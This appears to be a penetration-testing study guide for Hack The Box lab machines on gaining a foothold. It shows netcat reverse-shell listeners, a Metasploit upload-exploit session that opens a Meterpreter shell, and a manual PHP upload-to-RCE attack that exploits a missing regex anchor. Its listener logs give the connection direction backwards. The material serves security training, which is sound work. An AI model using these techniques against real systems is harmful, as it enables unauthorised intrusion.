# Foothold

 - [Reverse Shells](Foothold.md#reverse-shell)
 - [Common Vulnerabilities and Exposures (CVE)](Foothold.md#common-vulnerabilities-and-exposures-cve)
 - [Manual Remote Code Execution (RCE)](Foothold.md#manual-remote-code-execution)
 
## Reverse Shell
By far, this is a concept that will come up the most on just about every single machine.  
When you need something that offers command and control of a target after you've exploited it,  
you have two options: a file/port that you connect to or you make the server connect to you.  
Having the server connect to you is a much more reliable option.  

Utilizing a reverse shell is a three step process

 1. Setting up a listener on the attacking machine
    ```
    Command Breakdown:
        nc: TCP/IP swiss army knife, used to read and write data across network connections
        -n: No DNS
        -v: Verbose
        -l: Listen for inbound connections
        -p 4444: Local port to open for connections
    ```

    ```console
    user@parrot:~$ nc -nvlp 4444
    listening on [any] 4444 ...
    ```
     
 2. Executing a reverse shell on the target machine.  
    This step can use any number of programming languages and commands.  
    Luckily, there's a Github repository called [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)  
    that offers a cheat sheet for such a thing. (Among many other great materials)
    
 3. Return to the listener and start enumerating for a better user.
    ```console
    user@parrot:~$ nc -nvlp 4444
    listening on [any] 4444 ...
    connect to [10.10.10.10] from (UNKNOWN) [10.10.15.1] 33280
    www-data@example:/var/www/html$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    
## Common Vulnerabilities and Exposures (CVE)
Since getting the service versions was a part of the reconnaissance phase, it should be taken advantage of.  
Google the version of any services you find and see if there are any vulnerabilities.  
If lucky, there's a Metasploit module or a pre-made script on Exploit-DB.  
If a Metasploit module is used, you won't have to set up your own netcat listener.  
Pre-made scripts that you can download on Exploit-DB can be different;  
sometimes they'll drop you directly into a shell, and sometimes you have to give your own commands

There's a nice [SANS cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf) to help use Metasploit though.  
Here's an example run of a fake exploit to put the cheatsheet into perpsective.
```console
msf5 > search example

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/example_file_upload     2015-09-15       excellent  Yes    Examlple File Upload Vulnerability

msf5 > use 0
msf5 exploit(multi/http/example_file_upload) > options

Module options (exploit/multi/http/example_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   VHOST                       no        HTTP server virtual host

Exploit target:

   Id  Name
   --  ----
   0   Example 3.1.1

msf5 exploit(multi/http/example_file_upload) > set RHOSTS 10.10.10.10
RHOSTS => 10.10.10.10
msf5 exploit(multi/http/example_file_upload) > set TARGETURI /example/
TARGETURI => /example/
msf5 exploit(multi/http/example_file_upload) > run
[*] Started reverse TCP handler on 10.10.15.1:4444
[*] Sending stage (37543 bytes) to 10.10.10.10
[*] Meterpreter session 1 opened (10.10.15.1:4444 -> 10.10.10.10:56052) at 2020-07-11 20:51:40 -0500
[+] Deleted image.php
meterpreter > shell
Process 3816 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Manual Remote Code Execution
When it's not a well-known CVE with scripts already made for a specific vulnerability,  
then you might just have to do it yourself. If you run out of things to look for  
and you can't find any CVE's, then you can start going through user inputs to see  
what you might be able to exploit. This might normally be php file uploads on easy boxes.

My favorite example of this is executing php code from an uploaded image.  
Below, i've displayed a slightly simplified version of the default php config.  
```console
user@parrot:~$ cat /etc/apache2/mods-available/php7.4.conf
<FilesMatch ".+\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.php$">
    Require all denied
</FilesMatch>
```
The part of the config that keeps the website from executing images as well  
is the ending `$` symbol in the regular expression that specifies that it should end with `.php`.  
If a developer wanted to modify this and forgot the `$`,  
then files like `image.php.jpg` gets treated like PHP.  
Slightly more complex versions of this specific attack can use metadata,  
but what most of them have in common is that you have to create a reverse shell.  
In a file upload attack like this, you'd also have to curl the image to trigger it.
```console
user@parrot:~$ nc -nvlp 4444                                  ║ user@parrot:~$ curl 10.10.10.10/image.php.jpg
listening on [any] 4444 ...                                   ║
connect to [10.10.10.10] from (UNKNOWN) [10.10.15.1] 33280    ║
www-data@example:/var/www/html$ id                            ║
uid=33(www-data) gid=33(www-data) groups=33(www-data)         ║
```

The mindset to find this sort of vulnerability is the same mindset needed to  
find many other flavors of file upload and remote code execution attacks on HTB.  
If there's a place for user input on easier boxes, the odds are pretty good that it's exploitable;  
sometimes you'll have to be pretty creative with these things though.
